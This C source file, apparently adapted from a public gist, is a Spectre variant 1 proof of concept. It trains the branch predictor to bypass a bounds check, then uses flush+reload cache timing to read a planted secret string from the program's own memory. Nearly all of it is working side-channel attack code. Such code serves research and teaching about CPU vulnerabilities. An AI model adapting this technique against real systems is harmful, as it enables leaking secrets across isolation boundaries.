//! from https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h> /* for rdtscp and clflush */

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
char* victim_block;
char* oracle_block;

char * secret = "zoo";
int junk = 0;

void __attribute__((__always_inline__)) maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  junk = *(int*)ptr;
  //maccess(ptr);

  end = __rdtscp(&junk);
  _mm_mfence();
  _mm_clflush(ptr);

  return (int)(end - start);
}

void victim_function(size_t x) {
  if (x < array1_size) {
    junk &= *(oracle_block + victim_block[x] * 4096);
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  size_t training_x, x;
  //register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++){
    results[i] = 0;
  }
  for (tries = 30; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush(oracle_block + i * 4096); /* intrinsic for clflush instruction */


    _mm_mfence();
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      _mm_clflush(victim_block);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }
    _mm_mfence();

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = oracle_block + mix_i * 4096;
      if (flush_reload_t(addr) <= CACHE_HIT_THRESHOLD && mix_i != victim_block[tries % array1_size]){
          results[mix_i]++; /* cache hit - add +1 to score for this value */
      }
      _mm_mfence();
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = 16;
  int i, score[2], len = 3;
  uint8_t value[2];
  
  victim_block = malloc(16 + len);
  oracle_block = malloc(256 * 4096);

  for (i = 0; i < 16 + len; i++){
    if (i < 16){
      victim_block[i] = i;
      continue;
    }
    victim_block[i] = secret[i - 16];
  }

  //for (i = 0; i < sizeof(array2); i++)
  //  array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  return (0);
}